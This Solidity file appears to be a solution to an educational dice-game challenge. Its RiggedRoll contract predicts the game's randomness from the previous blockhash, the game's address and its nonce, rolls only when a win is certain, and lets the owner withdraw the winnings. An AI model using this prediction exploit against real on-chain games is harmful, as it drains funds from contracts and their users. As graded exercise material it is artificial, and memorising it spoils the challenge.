pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
	DiceGame public diceGame;
	address private s_diceaddress;

	error notEnoughETH();
	error notAWinner();

	constructor(address payable diceGameAddress) {
		s_diceaddress = diceGameAddress;
		diceGame = DiceGame(diceGameAddress);
	}

	// Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
	function riggedRoll() public {
		require(address(this).balance >= .002 ether, "not enough eth");
		bytes32 prevHash = blockhash(block.number - 1);
		bytes32 hash = keccak256(
			abi.encodePacked(prevHash, s_diceaddress, diceGame.nonce())
		);
		uint256 roll = uint256(hash) % 16;

		console.log("\t", " Rigged  Dice Game Roll:", roll);

		if (roll > 5) {
			revert notAWinner();
		}

		uint256 valueToSend = 2000000000000000; //0.002 ether;
		diceGame.rollTheDice{ value: valueToSend }();
	}

	// Include the `receive()` function to enable the contract to receive incoming Ether.
	receive() external payable {}

	// Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
	function withdraw(address _addr, uint256 _amount) public onlyOwner {
		require(
			address(this).balance >= _amount,
			"You can`t withdraw over balance"
		);
		(bool sent, ) = payable(_addr).call{ value: _amount }("");
		require(sent, "Withdraw failed");
	}
}
